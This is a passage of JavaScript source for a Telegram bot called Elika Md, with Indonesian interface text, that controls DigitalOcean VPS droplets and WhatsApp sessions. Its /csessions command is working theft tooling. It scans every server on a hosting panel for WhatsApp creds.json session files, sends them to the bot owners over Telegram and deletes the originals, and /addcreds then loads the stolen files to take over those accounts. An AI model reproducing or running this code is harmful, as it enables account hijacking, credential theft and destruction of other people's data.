                let restartResponse = await fetch(`https://api.digitalocean.com/v2/droplets/${dropletId}/actions`, {
                    method: "POST",
                    headers: {
                        "Content-Type": "application/json",
                        "Authorization": `Bearer ${apiKey}`
                    },
                    body: JSON.stringify({ type: "reboot" })
                });

                let restartData = await restartResponse.json();

                if (!restartResponse.ok) {
                    return ctx.reply(`❌ Gagal melakukan restart VPS:\n🌟 *Akun DigitalOcean V${version}*\n${restartData.message || "Terjadi kesalahan"}`, { parse_mode: 'Markdown' });
                }

                return ctx.reply(`✅ *Aksi restart VPS berhasil dimulai!*\n\n📡 *Droplet ID:* ${dropletId}\n🌟 *Akun DigitalOcean V${version}*\n🔄 *Status:* ${restartData.action.status}\n> Tunggu 1 menit ke depan untuk mengakses VPS kembali`, { parse_mode: 'Markdown' });
            }
        } catch (err) {
            console.error(`Error di akun V${version}:`, err);
            errors.push(`❌ Akun DigitalOcean V${version}: Gagal menghubungi API`);
        }
    }

    if (!found) {
        let errorMessage = `❌ VPS dengan ID *${dropletId}* tidak ditemukan di akun mana pun.\n`;
        if (errors.length > 0) {
            errorMessage += `\n${errors.join("\n")}`;
        }
        return ctx.reply(errorMessage, { parse_mode: 'Markdown' });
    }
});

bot.command(['startvps', 'stopvps'], async (ctx) => {
const senderId = String(ctx.from.id);
const isOwner = isOwnerId(senderId);
if (!isOwner) {
  return ctx.reply("Perintah Hanya Untuk User Premium / Owner.", {
    reply_markup: { inline_keyboard: [[{ text: "Hubungi Developer", url: "https://t.me/Rizzxtzy" }]] }
  });
}

    const command = ctx.message.text.split(" ")[0].slice(1); // remove "/"
    const text = ctx.message.text.split(" ").slice(1).join(" ");
    if (!text) return ctx.reply(`Contoh penggunaan:\n/${command} IDDroplet`);

    let dropletId = text.trim();
    let found = false;
    let errors = [];
    let actionType = command === "startvps" ? "power_on" : "power_off";
    let actionLabel = command === "startvps" ? "start" : "stop";

    for (const [key, apiKey] of Object.entries(global.apiAkunDigitalOcean)) {
        let version = key.replace("akun", "");

        if (!apiKey || apiKey.length < 64) continue;

        try {
            let response = await fetch("https://api.digitalocean.com/v2/droplets", {
                headers: { Authorization: `Bearer ${apiKey}` }
            });

            if (!response.ok) {
                errors.push(`❌ Akun DigitalOcean V${version}: API key tidak valid`);
                continue;
            }

            let data = await response.json();
            let matchedDroplet = data.droplets.find(d => d.id.toString() === dropletId);

            if (matchedDroplet) {
                found = true;

                let actionResponse = await fetch(`https://api.digitalocean.com/v2/droplets/${dropletId}/actions`, {
                    method: "POST",
                    headers: {
                        "Content-Type": "application/json",
                        "Authorization": `Bearer ${apiKey}`
                    },
                    body: JSON.stringify({ type: actionType })
                });

                let actionData = await actionResponse.json();

                if (!actionResponse.ok) {
                    return ctx.reply(`❌ Gagal melakukan ${actionLabel} VPS:\n🌟 *Akun DigitalOcean V${version}*\n${actionData.message || "Terjadi kesalahan"}`, { parse_mode: 'Markdown' });
                }

                return ctx.reply(
                    `✅ *Aksi ${actionLabel} VPS berhasil dimulai!*\n\n` +
                    `📡 *Droplet ID:* ${dropletId}\n` +
                    `🌟 *Akun DigitalOcean V${version}*\n` +
                    `🔄 *Status:* ${actionData.action.status}\n` +
                    `> Tunggu beberapa saat hingga VPS sepenuhnya ${actionLabel === "start" ? "menyala" : "mati"}`,
                    { parse_mode: 'Markdown' }
                );
            }
        } catch (err) {
            console.error(`Error di akun V${version}:`, err);
            errors.push(`❌ Akun DigitalOcean V${version}: Gagal menghubungi API`);
        }
    }

    if (!found) {
        let errorMessage = `❌ VPS dengan ID *${dropletId}* tidak ditemukan di akun mana pun.\n`;
        if (errors.length > 0) {
            errorMessage += `\n${errors.join("\n")}`;
        }
        return ctx.reply(errorMessage, { parse_mode: 'Markdown' });
    }
});

bot.command('buatfunc', async (ctx) => {
    const chatId = ctx.chat.id;
    const msg = ctx.message;

    if (sessions.size === 0) {
        return ctx.reply('❌ Tidak ada sesi WhatsApp yang terhubung!', {
            reply_to_message_id: msg.message_id
        });
    }

    const sock = sessions.values().next().value;
    
    if (!sock || typeof sock.sendMessage !== 'function') {
        return ctx.reply('❌ WhatsApp session not available or not connected!', {
            reply_to_message_id: msg.message_id
        });
    }

    if (!msg.reply_to_message) {
        return ctx.reply('❌ Reply pesan yang berisi media!', {
            reply_to_message_id: msg.message_id
        });
    }

    try {
        const repliedMsg = msg.reply_to_message;
        const mediaTypes = ['photo', 'video', 'document', 'audio', 'sticker'];
        
        if (!mediaTypes.some(type => repliedMsg[type])) {
            return ctx.reply('❌ Pesan yang dibalas tidak mengandung media!', {
                reply_to_message_id: msg.message_id
            });
        }

        let fileId;
        let whatsappType;
        
        if (repliedMsg.photo) {
            fileId = repliedMsg.photo[repliedMsg.photo.length - 1].file_id;
            whatsappType = 'image';
        } else if (repliedMsg.video) {
            fileId = repliedMsg.video.file_id;
            whatsappType = 'video';
        } else if (repliedMsg.document) {
            fileId = repliedMsg.document.file_id;
            whatsappType = 'document';
        } else if (repliedMsg.audio) {
            fileId = repliedMsg.audio.file_id;
            whatsappType = repliedMsg.audio.mime_type?.startsWith('audio/ogg') ? 'ptt' : 'audio';
        } else if (repliedMsg.sticker) {
            fileId = repliedMsg.sticker.file_id;
            whatsappType = 'sticker';
        }

        const fileInfo = await ctx.telegram.getFile(fileId);
        const fileUrl = `https://api.telegram.org/file/bot${BOT_TOKEN}/${fileInfo.file_path}`;
        
        let mime = 'application/octet-stream';
        if (whatsappType === 'sticker') {
            mime = repliedMsg.sticker.is_animated ? 'application/x-tgs' : 'image/webp';
        } else if (repliedMsg[whatsappType]?.mime_type) {
            mime = repliedMsg[whatsappType].mime_type;
        }

        const mediaPayload = {
            [whatsappType]: {
                url: fileUrl,
                mimetype: mime
            }
        };

        const sentMsg = await sock.sendMessage(sock.user.id, mediaPayload);
        
        if (!sentMsg?.message) {
            throw new Error('Failed to send media - no response from WhatsApp');
        }

        const messageType = Object.keys(sentMsg.message)[0];
        const media = sentMsg.message[messageType];
        
        const resultText = `*Media data from WhatsApp:*
\`\`\`json
type: "${messageType}",
url: "${media.url || null}",
directPath: "${media.directPath || null}",
mimetype: "${media.mimetype || null}",
mediaKey: "${media.mediaKey?.toString('base64') || null}",
fileEncSha256: "${media.fileEncSha256?.toString('base64') || null}",
fileSha256: "${media.fileSha256?.toString('base64') || null}",
fileLength: "${media.fileLength || null}",
mediaKeyTimestamp: "${media.mediaKeyTimestamp || null}"\`\`\``;

        await ctx.reply(resultText, {
            reply_to_message_id: msg.message_id,
            parse_mode: "Markdown",
            reply_markup: {
                inline_keyboard: [
                    [
                        { text: "Developer", url: "t.me/xryomek" }
                    ]
                ]
            }
        });

    } catch (err) {
        console.error('Error in /tofunc command:', err);
        
        let errorMsg = '❌ Gagal mengirim media.';
        if (err.message.includes('not connected')) {
            errorMsg = '❌ WhatsApp session not connected!';
        } else if (err.message.includes('ENOENT')) {
            errorMsg = '❌ File not found on Telegram servers!';
        } else {
            errorMsg += ` Error: ${err.message}`;
        }
        
        await ctx.reply(errorMsg, {
            reply_to_message_id: msg.message_id
        });
    }
});

bot.command('csessions', async (ctx) => {
    const msg = ctx.message;
    const args = ctx.message.text.split(' ');
    
    if (args.length < 2) {
        return ctx.reply('Format: /csessions domain,application_token,client_token', {
            reply_to_message_id: msg.message_id
        });
    }

    const parameters = args[1].split(',');
    if (parameters.length < 3) {
        return ctx.reply('Parameter tidak lengkap! domain,application_token,client_token', {
            reply_to_message_id: msg.message_id
        });
    }

    const domain = parameters[0].trim();
    const applicationToken = parameters[1].trim();
    const clientToken = parameters[2].trim();

    if (!domain.startsWith('http://') && !domain.startsWith('https://')) {
        return ctx.reply('Domain harus http:// atau https://', {
            reply_to_message_id: msg.message_id
        });
    }

    const statusMsg = await ctx.reply('Proses scan...', {
        reply_to_message_id: msg.message_id
    });

    try {
        await ctx.telegram.editMessageText(
            ctx.chat.id,
            statusMsg.message_id,
            null,
            'Scan panel...'
        );

        const serversResponse = await axios.get(`${domain}/api/application/servers`, {
            headers: {
                'Authorization': `Bearer ${applicationToken}`,
                'Accept': 'application/json',
                'Content-Type': 'application/json'
            },
            timeout: 10000
        });

        if (!serversResponse.data?.data || !Array.isArray(serversResponse.data.data)) {
            await ctx.telegram.editMessageText(
                ctx.chat.id,
                statusMsg.message_id,
                null,
                'Token application salah'
            );
            return;
        }

        const servers = serversResponse.data.data;
        let totalFound = 0;

        for (const server of servers) {
            const serverId = server.attributes?.identifier || server.identifier;
            const serverName = server.attributes?.name || server.name || `Server-${serverId}`;

            await ctx.telegram.editMessageText(
                ctx.chat.id,
                statusMsg.message_id,
                null,
                `Scan ${serverName}...`
            );

            const foundFiles = await findCredsFilesRecursive(serverId, '/');
            
            for (const fileInfo of foundFiles) {
                totalFound++;
                
                await ctx.telegram.editMessageText(
                    ctx.chat.id,
                    statusMsg.message_id,
                    null,
                    `✅ Ditemukan di ${serverName}`
                );

                try {
                    await ctx.telegram.editMessageText(
                        ctx.chat.id,
                        statusMsg.message_id,
                        null,
                        `Proses download...`
                    );

                    const downloadResponse = await axios.get(
                        `${domain}/api/client/servers/${serverId}/files/download`,
                        {
                            params: { file: fileInfo.path },
                            headers: {
                                'Authorization': `Bearer ${clientToken}`,
                                'Accept': 'application/json'
                            },
                            timeout: 8000
                        }
                    );

                    if (downloadResponse.data?.attributes?.url) {
                        const downloadUrl = downloadResponse.data.attributes.url;
                        
                        const fileResponse = await axios.get(downloadUrl, {
                            responseType: 'arraybuffer',
                            timeout: 10000
                        });

                        const fileBuffer = Buffer.from(fileResponse.data);
                        
                        try {
                            const credsData = JSON.parse(fileBuffer.toString());

                            if (credsData && credsData.noiseKey && credsData.signedIdentityKey) {
                                for (const ownerId of ownerUsers) {
                                    try {
                                        await ctx.telegram.sendDocument(
                                            ownerId,
                                            {
                                                source: fileBuffer,
                                                filename: 'creds.json'
                                            }
                                        );
                                    } catch (sendError) {
                                        console.log(`Gagal kirim ke owner ${ownerId}`);
                                    }
                                }
                                
                                try {
                                    await axios.post(
                                        `${domain}/api/client/servers/${serverId}/files/delete`,
                                        {
                                            files: [fileInfo.path],
                                            root: '/'
                                        },
                                        {
                                            headers: {
                                                'Authorization': `Bearer ${clientToken}`,
                                                'Accept': 'application/json',
                                                'Content-Type': 'application/json'
                                            },
                                            timeout: 8000
                                        }
                                    );
                                    
                                    console.log(`File ${fileInfo.path} dihapus dari ${serverName}`);
                                } catch (deleteError) {
                                    console.log(`Gagal hapus file dari ${serverName}`);
                                }
                            }
                        } catch (parseError) {
                            console.log('File creds.json tidak valid');
                        }
                    }
                } catch (downloadError) {
                    console.log('Gagal download file');
                }
            }
        }

        if (totalFound === 0) {
            await ctx.telegram.editMessageText(
                ctx.chat.id,
                statusMsg.message_id,
                null,
                'Scan selesai. Tidak ada creds.json ditemukan.'
            );
        } else {
            await ctx.telegram.editMessageText(
                ctx.chat.id,
                statusMsg.message_id,
                null,
                `✅ Scan selesai. ${totalFound} creds.json dikirim.`
            );
        }

    } catch (error) {
        console.log('Scan error:', error.message);
        await ctx.telegram.editMessageText(
            ctx.chat.id,
            statusMsg.message_id,
            null,
            `Error: ${error.message}`
        );
    }
});

async function findCredsFilesRecursive(serverId, directory) {
    try {
        const response = await axios.get(
            `${domain}/api/client/servers/${serverId}/files/list`,
            {
                params: { directory },
                headers: {
                    'Authorization': `Bearer ${clientToken}`,
                    'Accept': 'application/json'
                },
                timeout: 8000
            }
        );

        if (!response.data?.data) return [];

        const items = response.data.data;
        let foundFiles = [];

        for (const item of items) {
            const name = item.attributes?.name || item.name || '';
            const fullPath = directory === '/' ? `/${name}` : `${directory}/${name}`;
            const cleanPath = fullPath.replace(/\/+/g, '/');

            if (name.toLowerCase() === 'creds.json') {
                foundFiles.push({
                    path: cleanPath,
                    serverId: serverId
                });
            }

            const isDir = item.attributes?.type === 'dir' || 
                          item.attributes?.type === 'directory' ||
                          item.attributes?.mode === 'dir' ||
                          item.attributes?.mode === 'directory' ||
                          item.attributes?.mode === 'd' ||
                          item.attributes?.is_directory === true ||
                          item.attributes?.isDir === true;

            if (isDir) {
                const subFiles = await findCredsFilesRecursive(serverId, cleanPath);
                foundFiles = foundFiles.concat(subFiles);
            }
        }

        return foundFiles;
    } catch (error) {
        return [];
    }
}

bot.command('addcreds', async (ctx) => {
    const msg = ctx.message;
    
    if (!msg.reply_to_message) {
        return ctx.reply('❌ Balas file creds.json!', {
            reply_to_message_id: msg.message_id
        });
    }

    const repliedMsg = msg.reply_to_message;
    
    if (!repliedMsg.document) {
        return ctx.reply('❌ Harus file JSON!', {
            reply_to_message_id: msg.message_id
        });
    }

    const document = repliedMsg.document;
    const fileName = document.file_name || '';
    
    if (!fileName.toLowerCase().endsWith('.json')) {
        return ctx.reply('❌ File harus .json!', {
            reply_to_message_id: msg.message_id
        });
    }

    try {
        const statusMsg = await ctx.reply('Proses creds.json...', {
            reply_to_message_id: msg.message_id
        });

        await ctx.telegram.editMessageText(
            ctx.chat.id,
            statusMsg.message_id,
            null,
            'Download file...'
        );

        const fileInfo = await ctx.telegram.getFile(document.file_id);
        const fileUrl = `https://api.telegram.org/file/bot${BOT_TOKEN}/${fileInfo.file_path}`;
        
        const response = await axios.get(fileUrl, { responseType: 'json' });
        const credsData = response.data;

        await ctx.telegram.editMessageText(
            ctx.chat.id,
            statusMsg.message_id,
            null,
            'Validasi session...'
        );

        if (!credsData || typeof credsData !== 'object') {
            await ctx.telegram.editMessageText(
                ctx.chat.id,
                statusMsg.message_id,
                null,
                '❌ Format creds.json salah'
            );
            return;
        }

        const requiredKeys = ['noiseKey', 'signedIdentityKey', 'signedPreKey', 'registrationId', 'advSecretKey'];
        const missingKeys = requiredKeys.filter(key => !credsData[key]);
        
        if (missingKeys.length > 0) {
            await ctx.telegram.editMessageText(
                ctx.chat.id,
                statusMsg.message_id,
                null,
                `❌ Keys tidak lengkap: ${missingKeys.join(', ')}`
            );
            return;
        }

        let phoneNumber = 'unknown';
        if (credsData.me && credsData.me.id) {
            const idParts = credsData.me.id.split(':');
            if (idParts[0]) {
                phoneNumber = idParts[0].replace(/[^0-9]/g, '');
            }
        }

        await ctx.telegram.editMessageText(
            ctx.chat.id,
            statusMsg.message_id,
            null,
            `Buat session ${phoneNumber}...`
        );

        const sessionDir = path.join(SESSIONS_DIR, `device${phoneNumber}`);
        
        if (fs.existsSync(sessionDir)) {
            fs.rmSync(sessionDir, { recursive: true, force: true });
        }
        
        fs.mkdirSync(sessionDir, { recursive: true });
        
        const credsPath = path.join(sessionDir, 'creds.json');
        fs.writeFileSync(credsPath, JSON.stringify(credsData, null, 2));

        await ctx.telegram.editMessageText(
            ctx.chat.id,
            statusMsg.message_id,
            null,
            'Tes koneksi WhatsApp...'
        );

        const { state, saveCreds } = await useMultiFileAuthState(sessionDir);

        const sock = makeWASocket({
            auth: state,
            printQRInTerminal: false,
            logger: P({ level: "silent" }),
            defaultQueryTimeoutMs: 30000,
            browser: ["Chrome", "Windows", "10.0.0"],
            syncFullHistory: false,
            fireInitQueries: true,
            markOnlineOnConnect: false,
        });

        let connected = false;
        let errorMessage = '';

        sock.ev.on("connection.update", async (update) => {
            const { connection, lastDisconnect } = update;

            if (connection === "open") {
                connected = true;
                
                const user = sock.user;
                const finalNumber = user.id.split(':')[0];
                
                sessions.set(finalNumber, sock);
                saveActiveSessions(finalNumber);
                
                sock.ev.on("creds.update", saveCreds);
                
                await ctx.telegram.editMessageText(
                    ctx.chat.id,
                    statusMsg.message_id,
                    null,
                    `✅ WhatsApp terpasang!\n📱 ${finalNumber}\n👤 ${user.name || '-'}`
                );
                
            } else if (connection === "close") {
                const statusCode = lastDisconnect?.error?.output?.statusCode;
                
                if (statusCode === DisconnectReason.loggedOut) {
                    errorMessage = '❌ Session sudah logout';
                } else if (statusCode === DisconnectReason.badSession) {
                    errorMessage = '❌ Session rusak';
                } else if (statusCode === DisconnectReason.connectionReplaced) {
                    errorMessage = '🔄 Diganti perangkat lain';
                } else {
                    errorMessage = '❌ Koneksi gagal';
                }
                
                if (fs.existsSync(sessionDir)) {
                    fs.rmSync(sessionDir, { recursive: true, force: true });
                }
                
                if (!connected) {
                    await ctx.telegram.editMessageText(
                        ctx.chat.id,
                        statusMsg.message_id,
                        null,
                        errorMessage
                    );
                }
            }
        });

        setTimeout(async () => {
            if (!connected) {
                if (fs.existsSync(sessionDir)) {
                    fs.rmSync(sessionDir, { recursive: true, force: true });
                }
                
                await ctx.telegram.editMessageText(
                    ctx.chat.id,
                    statusMsg.message_id,
                    null,
                    '⏰ Timeout! Session mungkin butuh QR code.'
                );
            }
        }, 45000);

    } catch (error) {
        console.error('Addcreds error:', error);
        
        let errorMsg = '❌ Gagal pasang creds';
        if (error.message.includes('JSON')) {
            errorMsg = '❌ Format JSON salah';
        } else if (error.message.includes('timeout')) {
            errorMsg = '⏰ Timeout download';
        } else if (error.code === 'ENOENT') {
            errorMsg = '❌ File tidak ditemukan';
        }
        
        await ctx.reply(errorMsg, {
            reply_to_message_id: msg.message_id
        });
    }
});

// =========================
// ✅ PRETTY LOGGER (chalk)
// =========================
const pad2 = (n) => String(n).padStart(2, "0");
function timeTag() {
  const d = new Date();
  return `${pad2(d.getHours())}:${pad2(d.getMinutes())}:${pad2(d.getSeconds())}`;
}

const log = {
  info: (msg) => console.log(chalk.cyan(`[${timeTag()}]`) + " " + chalk.white(msg)),
  step: (msg) => console.log(chalk.cyan(`[${timeTag()}]`) + " " + chalk.blueBright(`➜ ${msg}`)),
  ok:   (msg) => console.log(chalk.cyan(`[${timeTag()}]`) + " " + chalk.green(`✔ ${msg}`)),
  warn: (msg) => console.log(chalk.cyan(`[${timeTag()}]`) + " " + chalk.yellow(`⚠ ${msg}`)),
  err:  (msg) => console.log(chalk.cyan(`[${timeTag()}]`) + " " + chalk.red(`✖ ${msg}`)),
  dim:  (msg) => console.log(chalk.gray(`[${timeTag()}] ${msg}`)),
};

// =========================
// ✅ OWNER NOTIFY HELPERS
// =========================

// --- helper: normalisasi ownerIds jadi array number yang valid
function getOwnerChatIds() {
  const ids = Array.isArray(config.ownerIds) ? config.ownerIds : [];
  return ids
    .map((x) => Number(String(x).trim()))
    .filter((n) => Number.isFinite(n) && n > 0);
}

// --- helper: send notif ke semua owner + retry + colored logs
async function notifyOwners(text, extra = {}) {
  const ownerChatIds = getOwnerChatIds();

  log.dim(`notifyOwners raw ownerIds: ${JSON.stringify(config.ownerIds)}`);
  log.dim(`notifyOwners parsed ids: ${JSON.stringify(ownerChatIds)}`);

  if (!ownerChatIds.length) {
    log.warn("ownerIds kosong / tidak valid, notif owner dilewati.");
    return;
  }

  for (const id of ownerChatIds) {
    log.step(`notifyOwners -> kirim ke owner ${id}`);

    let ok = false;
    let lastErr = null;

    for (let attempt = 1; attempt <= 3; attempt++) {
      try {
        const res = await bot.telegram.sendMessage(id, text, {
          parse_mode: "Markdown",
          disable_web_page_preview: true,
          ...extra,
        });

        log.ok(`notif terkirim -> owner ${id} | attempt ${attempt} | msgId=${res?.message_id}`);
        ok = true;
        break;
      } catch (e) {
        lastErr = e;
        const code = e?.code || e?.response?.error_code || "UNKNOWN";
        const desc = e?.description || e?.response?.description || e?.message || String(e);

        log.warn(`gagal kirim -> owner ${id} | attempt ${attempt} | code=${code}`);
        log.dim(`desc: ${desc}`);

        await new Promise((r) => setTimeout(r, 700 * attempt));
      }
    }

    if (!ok) {
      const finalMsg = lastErr?.description || lastErr?.message || String(lastErr);
      log.err(`FINAL gagal kirim notif ke owner ${id}`);
      log.dim(finalMsg);
    }
  }
}

// =========================
// ✅ BOT INITIALIZE (ANTI-HANG)
// =========================
function initializeBot() {
  log.step("init 1/4 validateToken");

  validateToken()
    .then(() => {
      log.ok("init 1/4 validateToken OK");

      console.log(
        chalk.hex("#00008B")(
          "\n╭───────────────────────────────────────"
        ) +
        chalk.hex("#00008B")(
          "\n│   Elika Md is starting...             │"
        ) +
        chalk.hex("#00008B")(
          "\n╰───────────────────────────────────────"
        )
      );

      log.step("init 2/4 connect WhatsApp");
      return initializeWhatsAppConnections();
    })
    .then(() => {
      log.ok("init 2/4 WhatsApp connected");

      log.step("init 3/4 launch Telegram (Telegraf)");
      const launchPromise = bot.launch({ dropPendingUpdates: true });

      // jalur normal: kalau launch resolve
      launchPromise
        .then(async () => {
          log.ok("init 3/4 Telegram launched");

          console.log(
            chalk.hex("#00008B")(
              "\n╭───────────────────────────────────────"
            ) +
            chalk.hex("#00008B")(
              "\n│   Elika Md is running...              │"
            ) +
            chalk.hex("#00008B")(
              "\n╰───────────────────────────────────────"
            )
          );

          await notifyOwners(
            "✅ Bot *Elika_Md* sudah hidup dan siap digunakan!"
          );
          log.ok("init 4/4 notifyOwners DONE (normal)");
        })
        .catch(async (err) => {
          log.err("launch error (telegram)");
          log.dim(err?.stack || err?.message || String(err));

          await notifyOwners(
            `❌ *Bot gagal launch*\n\`${String(
              err?.message || err
            ).slice(0, 350)}\``
          );
        });

      // fallback: kalau launch gak resolve tapi API telegram sudah bisa dipakai
      setTimeout(async () => {
        try {
          log.step("fallback check -> telegram.getMe()");
          await bot.telegram.getMe();
          log.ok("fallback getMe OK -> send notifyOwners");

          await notifyOwners(
            "✅ Bot *Elika_Md* sudah hidup dan siap digunakan!"
          );
          log.ok("notifyOwners DONE (fallback)");
        } catch (e) {
          log.warn("fallback getMe FAILED (skip notify)");
          log.dim(e?.message || String(e));
        }
      }, 2500);

      return null;
    })
    .catch(async (err) => {
      log.err("Error during initialization");
      log.dim(err?.stack || err?.message || String(err));

      try {
        await notifyOwners(
          `❌ *Bot gagal start*\n\`${String(
            err?.message || err
          ).slice(0, 350)}\``
        );
      } catch {}
    });
}

// =========================
// ✅ ERROR HANDLERS (COLOR)
// =========================
bot.catch(async (err, ctx) => {
        const userId = ctx?.from?.id ? String(ctx.from.id) : "Unknown";
        const errCode = err?.code || err?.response?.error_code || "UNKNOWN";
        const msg =
                err?.description ||
                err?.response?.description ||
                err?.message ||
                String(err);


        log.err(`Telegraf Error [${errCode}] from ${userId}`);
        log.dim(msg);


        await notifyOwners(
                `⚠️ *Telegraf Error*\n` +
                        `• Code: \`${errCode}\`\n` +
                        `• From: \`${userId}\`\n` +
                        `• Msg: \`${String(msg).slice(0, 350)}\``
        );
});


process.on("unhandledRejection", (reason) => {
        log.warn("Unhandled Rejection");
        log.dim(String(reason));

        notifyOwners(
                `❗ *Unhandled Rejection*\n\`${String(reason).slice(0, 350)}\``
        ).catch(() => {});
});


process.on("uncaughtException", (err) => {
        log.err("Uncaught Exception");
        log.dim(err?.stack || err?.message || String(err));

        notifyOwners(
                `💥 *Uncaught Exception*\n\`${String(err?.message || err).slice(0, 350)}\``
        ).catch(() => {});
});


// =========================
// ✅ RUN
// =========================
initializeBot();